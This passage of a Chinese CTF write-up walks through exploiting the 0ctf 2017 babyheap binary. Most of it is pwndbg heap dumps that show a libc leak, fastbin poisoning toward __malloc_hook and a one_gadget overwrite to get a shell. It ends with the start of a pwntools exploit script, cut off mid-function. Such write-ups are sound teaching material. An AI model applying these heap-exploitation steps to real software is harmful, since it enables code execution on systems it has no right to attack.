class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">#alloc(0x80)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-释放chunk4"><a href="#9-释放chunk4" class="headerlink" title="9.释放chunk4"></a>9.释放chunk4</h4><blockquote>
+<p>因为此时idx2、4都指向chunk4，故可以释放chunk4，此时它里面会填入main_arena中地址，可以计算得到libc_base</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-打印idx2-即idx4内容"><a href="#10-打印idx2-即idx4内容" class="headerlink" title="10.打印idx2(即idx4内容)"></a>10.打印idx2(即idx4内容)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-申请0x60的块"><a href="#11-申请0x60的块" class="headerlink" title="11.申请0x60的块"></a>11.申请0x60的块</h4><blockquote>
+<p>新块的idx为4（把idx4给了分配的块，为分配的0x21没有idx）</p>
+<p>切割0x91的块，剩下0x21放入了unsortedbin中</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
+
+<h4 id="12-释放0x60的块"><a href="#12-释放0x60的块" class="headerlink" title="12.释放0x60的块"></a>12.释放0x60的块</h4><blockquote>
+<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助，，，</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
+
+<h4 id="13-修改idx2的内容，为malloc-hook附近构造chunk的地址"><a href="#13-修改idx2的内容，为malloc-hook附近构造chunk的地址" class="headerlink" title="13.修改idx2的内容，为malloc_hook附近构造chunk的地址"></a>13.修改idx2的内容，为malloc_hook附近构造chunk的地址</h4><blockquote>
+<p>需要改地址，有fastbin大小的八字节数字，，，</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#payload &#x3D; p64(libc_base+0x3c4aed)</span><br><span class="line">#fill(2, payload)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5614ee1f6090:	0x00007f6a86e67aed	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f6a86e67aed#修改后的地址</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">#接下来申请两遍，即可得到0x7f6a86e67aed地址的块，可以对0x7f6a86e67aed进行数据读写</span><br><span class="line">0x70: 0x5614ee1f6080 —▸ 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<h4 id="14-申请回第一个0x60块"><a href="#14-申请回第一个0x60块" class="headerlink" title="14.申请回第一个0x60块"></a>14.申请回第一个0x60块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67aed</span><br><span class="line">0x7f6a86e67aed &lt;_IO_wide_data_0+301&gt;:	0x6a86e66260000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67afd:	0x6a86b28ea0000000	0x6a86b28a7000007f</span><br><span class="line">0x7f6a86e67b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f6a86e67b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b4d &lt;main_arena+45&gt;:	0x6a86e67aed000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x14ee1f61a0000000</span><br><span class="line">0x7f6a86e67b7d &lt;main_arena+93&gt;:	0x14ee1f60f0000056	0x14ee1f60f0000056</span><br><span class="line">0x7f6a86e67b8d &lt;main_arena+109&gt;:	0x14ee1f60f0000056	0x6a86e67b88000056</span><br><span class="line">0x7f6a86e67b9d &lt;main_arena+125&gt;:	0x6a86e67b8800007f	0x6a86e67b9800007f</span><br><span class="line">0x7f6a86e67bad &lt;main_arena+141&gt;:	0x6a86e67b9800007f	0x6a86e67ba800007f</span><br><span class="line">0x7f6a86e67bbd &lt;main_arena+157&gt;:	0x6a86e67ba800007f	0x6a86e67bb800007f</span><br><span class="line">0x7f6a86e67bcd &lt;main_arena+173&gt;:	0x6a86e67bb800007f	0x6a86e67bc800007f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x00007f6a86b28ea0	0x00007f6a86b28a70</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x00007f6a86ae826a	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
+
+<h4 id="15-申请到假的chunk，修改malloc-hook-gt-gadget"><a href="#15-申请到假的chunk，修改malloc-hook-gt-gadget" class="headerlink" title="15.申请到假的chunk，修改malloc_hook-&gt;gadget"></a>15.申请到假的chunk，修改malloc_hook-&gt;gadget</h4><blockquote>
+<p>最后只要执行malloc操作，即可get shell</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",25261)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	